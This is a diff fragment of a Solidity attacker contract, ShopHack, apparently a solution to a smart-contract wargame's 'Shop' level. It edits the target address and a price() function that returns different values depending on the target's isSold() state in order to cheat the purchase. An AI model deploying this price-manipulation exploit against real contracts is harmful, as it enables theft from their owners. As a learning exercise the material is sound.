@@ -7,10 +7,10 @@ interface IShop {
 }
 
 contract ShopHack {
-    IShop public shop = IShop(0xA4F2CaA5d20dA5FcE5Dc9E7049a112E067297cA9);
+    IShop public shop = IShop(0x8322BB11729Ea87E0c18693D29d2c8866aa10EAa);
 
     function price() public view returns (uint256) {
-        return IShop(msg.sender).isSold() ? 0 : 100;
+        return shop.isSold() ? 0 : 100;
     }
 
     function buy() public {
